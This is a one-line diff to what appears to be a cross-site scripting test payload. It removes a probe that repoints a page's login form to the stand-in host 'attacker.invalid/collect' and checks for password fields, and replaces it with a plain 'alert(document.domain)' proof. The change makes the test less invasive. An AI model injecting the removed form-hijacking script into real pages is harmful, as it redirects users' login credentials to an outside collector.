@@ -1,1 +1,1 @@
-window.__rei_xss_probe=(function(){var f=document.querySelector('#login-form');var b=f?(f.getAttribute('action')||'(none)'):'no-form';if(f){f.setAttribute('action','https://attacker.invalid/collect');}var a=f?(f.getAttribute('action')||'(none)'):'no-form';if(f){f.setAttribute('action',b==='(none)'?'':b);}return{origin:location.origin,hasPw:!!document.querySelector('input[type=password]'),emailInput:!!document.querySelector('#login-screen-email'),formId:f?f.id:null,actionBefore:b,actionAfter:a};})();document.title='REI-XSS:'+location.origin;
+alert(document.domain);
